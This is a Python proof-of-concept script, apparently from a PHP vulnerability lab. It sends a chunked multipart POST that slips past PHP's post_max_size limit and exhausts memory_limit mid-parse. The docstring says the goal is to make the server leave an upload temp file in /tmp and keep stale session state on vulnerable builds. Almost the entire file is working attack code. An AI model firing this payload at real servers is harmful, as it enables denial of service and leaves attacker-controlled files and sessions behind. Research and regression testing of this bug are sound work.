#!/usr/bin/env python3
"""php2shell lab, variant 2: chunked post_max_size bypass -> OOM fatal mid-parse.

Chunked HTTP/1.1 (no Content-Length) makes PHP consume bytes far beyond
post_max_size (8M default). A giant in-memory form field blows past
memory_limit (128M default) during multipart parsing in request startup.
Documented consequences to observe on the VULNERABLE build:
  - apache log: "Allowed memory size ... exhausted" (fatal mid-parse)
  - upload temp file left behind in /tmp (bug #78876, cleanup skipped)
  - worker survives (mod_php prefork) with stale session state
The FIXED build (8.2.35+) must show neither artifact.

Usage: python3 oom2.py <base_url> [field_mb]
"""
import socket
import sys
from urllib.parse import urlparse

SID = "deadbeefcafe0123456789abcdef0123"
BOUND = "Chunked618"


def part_head(name, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return f"--{BOUND}\r\n{disp}\r\n\r\n".encode()


def main():
    base = sys.argv[1]
    field_mb = int(sys.argv[2]) if len(sys.argv) > 2 else 200
    u = urlparse(base)
    host, port, path = u.hostname, u.port or 80, u.path or "/"

    def chunk(data):
        return f"{len(data):x}\r\n".encode() + data + b"\r\n"

    body = b""
    body += part_head("PHPSESSID") + SID.encode() + b"\r\n"
    body += part_head("PHP_SESSION_UPLOAD_PROGRESS") + b"x\r\n"
    body += part_head("evidence", filename="evidence.txt") + b"LEAKME-" + b"E" * 2048 + b"\r\n"
    body += part_head("junk")
    mb = b"A" * (1024 * 1024)
    total = 0

    s = socket.create_connection((host, port), timeout=60)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: oom2-chunked\r\n"
        f"Cookie: PHPSESSID={SID}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s.sendall(head)
    for piece in (body,):
        s.sendall(chunk(piece))
    for i in range(field_mb):
        s.sendall(chunk(mb))
        total += len(mb)
        if i % 40 == 0:
            print(f"  streamed {total // (1024*1024)}MB...", flush=True)
    s.sendall(b"0\r\n\r\n")
    s.settimeout(25)
    chunks = []
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            chunks.append(d)
    except socket.timeout:
        pass
    s.close()
    resp = b"".join(chunks)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO-RESPONSE (worker died mid-request)"
    print("status:", status)
    print("body head:", resp.split(b"\r\n\r\n", 1)[-1][:200])


if __name__ == "__main__":
    main()
